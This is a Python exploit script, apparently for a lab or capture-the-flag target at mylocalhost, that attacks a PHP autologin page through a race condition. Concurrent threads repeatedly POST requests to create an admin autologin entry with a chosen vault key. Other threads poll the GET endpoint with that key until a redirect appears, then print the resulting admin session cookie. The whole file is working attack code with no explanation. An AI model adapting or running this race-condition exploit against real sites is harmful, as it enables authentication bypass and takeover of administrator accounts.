import threading
import requests
import sys

URL = "http://mylocalhost:8081/autologin.php"
COOKIES = {"PHPSESSID": "030b5d4bb2783341f0a9daccd92d7516"}
PAYLOAD = "bingochin" 

stop_flag = False

def poster():
    global stop_flag
    session = requests.Session()
    data = {
        "action": "create_by_username",
        "username": "admin",
        "expires_on": PAYLOAD,
        "unlimited_use": "on"
    }
    while not stop_flag:
        try:
            session.post(URL, data=data, cookies=COOKIES, timeout=1)
        except Exception:
            pass

def getter():
    global stop_flag
    session = requests.Session()
    while not stop_flag:
        try:
            res = session.get(URL + "?vault_key=" + PAYLOAD, allow_redirects=False, timeout=1)
            
            if res.status_code == 302:
                print("\n[+] Raceeeeeeee!!!")
                if "Set-Cookie" in res.headers:
                    print(f"[==>] Set-Cookie: {res.headers['Set-Cookie']}")
                stop_flag = True
                sys.exit(0)
        except Exception:
            pass

if __name__ == "__main__":
    print("[*] Stacking threads and flush (Keep-Alive)...")
    threads = []
    
    for _ in range(5):
        t = threading.Thread(target=poster)
        threads.append(t)
        t.start()
        
    for _ in range(5):
        t = threading.Thread(target=getter)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()